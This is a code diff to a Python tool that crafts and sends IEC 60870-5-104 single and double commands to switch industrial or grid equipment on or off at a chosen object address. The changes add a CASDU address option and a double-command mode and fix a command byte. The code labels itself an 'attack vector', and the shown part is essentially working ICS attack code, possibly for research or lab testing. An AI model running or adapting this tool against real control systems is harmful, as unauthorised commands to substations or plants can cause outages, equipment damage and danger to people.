@@ -33,9 +33,9 @@ References:
 7. ITU-T X.25 specification:
    https://www.itu.int/rec/dologin_pub.asp?lang=e&id=T-REC-X.25-199610-I!!PDF-E&type=items
 """
-__version__ = "0.3.5"
+__version__ = "0.3.9"
 __author__ = "Lockout"
-__year__ = "2018"
+__year__ = "2021"
 
 import argparse
 import socket
@@ -59,6 +59,13 @@ def apci_typeI_enc(number):
 def apci_ioa_enc(number):
     """Encode a number to Information Object Address (IOA) 3 Byte value"""
     hexnum = hex(number)[2:].zfill(6)
+    hexnum = unhexlify(hexnum)[::-1]
+    return hexnum
+
+
+def casdu_addr_enc(number):
+    """Encode a number to CASDU address 2 Bye value"""
+    hexnum = hex(number)[2:].zfill(4)
     hexnum = unhexlify(hexnum)[::-1]
     return hexnum
 
@@ -148,6 +155,12 @@ def main():
             help="Network interface name",
             required=True
             )
+    reqParser.add_argument(
+            '-c', '--casdu',
+            type=int,
+            default=1,
+            help="CASDU address number"
+            )
     optParser.add_argument(
             '-T', '--tx',
             type=int,
@@ -179,6 +192,11 @@ def main():
             help="Payload size to receive in bytes. Default = 1000"
             )
     optParser.add_argument(
+            '--dc',
+            action="store_true",
+            help="Send Double Command"
+            )
+    optParser.add_argument(
             '--nocolor',
             action="store_true",
             help="Disable color print"
@@ -206,7 +224,7 @@ def main():
     ON = b'\x01'                        # SCO LSB = 1, '\x01'
     OFF = b'\x00'                       # SCO LSB = 0, '\x00'
     DC_ON = b'\x06'                     # DCO
-    DC_OFF = b'0x05'                    # DCO
+    DC_OFF = b'\x05'                    # DCO
     PAYLOADSIZE = args.payloadsize
     TIMEOUT = args.timeout
 
@@ -223,11 +241,17 @@ def main():
     TxID = args.tx
     RxID = args.rx
     switchid = args.ioa                 # Information Object Address
-    # TODO: add logic here to include DC
+    # TODO: SC / DC logic
     if args.state == 1:
-        state = ON
+        if args.dc == True:
+            state = DC_ON
+        else:
+            state = ON
     if args.state == 0:
-        state = OFF
+        if args.dc == True:
+            state = DC_OFF
+        else:
+            state = OFF
 
     #
     # ATTACK VECTOR 1:
@@ -296,7 +320,7 @@ def main():
     # SCO
     TypeID = b'\x2d'                    # Type ID: C_SC_NA_1 Act \x2d
     opt = b'\x01\x06\x00'               # SQ,NumIx,CauseIx,Negative,Test,OA
-    Addr = b'\x01\x00'                  # Addr
+    Addr = casdu_addr_enc(args.casdu)   # CASDU Addr
     IOA = apci_ioa_enc(switchid)        # 101, 201, 301
     SCO = state                         # LSb: 0 = off, 1 = On
     ASDU = TypeID + opt + Addr + IOA + SCO
@@ -304,7 +328,7 @@ def main():
     # DCO
     TypeID = b'\x2e'                    # Type ID: C_DC_NA_1 Act \x2e
     opt = b'\x01\x06\x00'               # SQ,NumIx,CauseIx,Negative,Test,OA
-    Addr = b'\x01\x00'                  # Addr
+    Addr = casdu_addr_enc(args.casdu)   # CASDU Addr
     IOA = apci_ioa_enc(switchid)        # 101, 201, 301
     DCO = state                         # Execute: 5 = off, 6 = on
     DC_ASDU = TypeID + opt + Addr + IOA + DCO
@@ -341,14 +365,19 @@ def main():
     APDU = APCI + ASDU
     DC_APDU = APCI + DC_ASDU
     # Send either SC or DC APDU, default is SC
-    # TODO: add logic here
-    payload = APDU
+    # TODO: SC / DC logic
+    if args.dc == True:
+        payload = DC_APDU
+    else:
+        payload = APDU
 
     # Deliver APDU payload
     try:
-        cprint("Sending SC Act IOA: {0} to state: {1}".format(
+        cprint("Sending {0} Act CASDU: {1} IOA: {2} to state: {3}".format(
+            'DC' if args.dc == True else 'SC',
+            args.casdu,
             switchid,
-            "OFF" if state == b'\x00' else "ON"),
+            "OFF" if state == b'\x00' or state == b'\x05' else "ON"),
             "msgInfo",
             color
             )
@@ -356,11 +385,11 @@ def main():
         tcp_ack = s.recv(PAYLOADSIZE)
         act_ack = s.recv(PAYLOADSIZE)
         if b'\x01\x07\x00' in tcp_ack or b'\x01\x07\x00' in act_ack:
-            cprint("SC ActCon received", "msgOK", color)
+            cprint("ActCon received", "msgOK", color)
         if b'\x01\x4a\x00' in tcp_ack or b'\x01\x4a\x00' in act_ack:
-            cprint("SC ActTerm_NEG received", "msgNOK", color)
+            cprint("ActTerm_NEG received", "msgNOK", color)
         if b'\x01\x0a\x00' in tcp_ack or b'\x01\x0a\x00' in act_ack:
-            cprint("SC ActTerm received", "msgNOK", color)
+            cprint("ActTerm received", "msgNOK", color)
     except Exception as err:
         s.close()
         cprint("APDU send error: {0}".format(err), "msgErr", color)
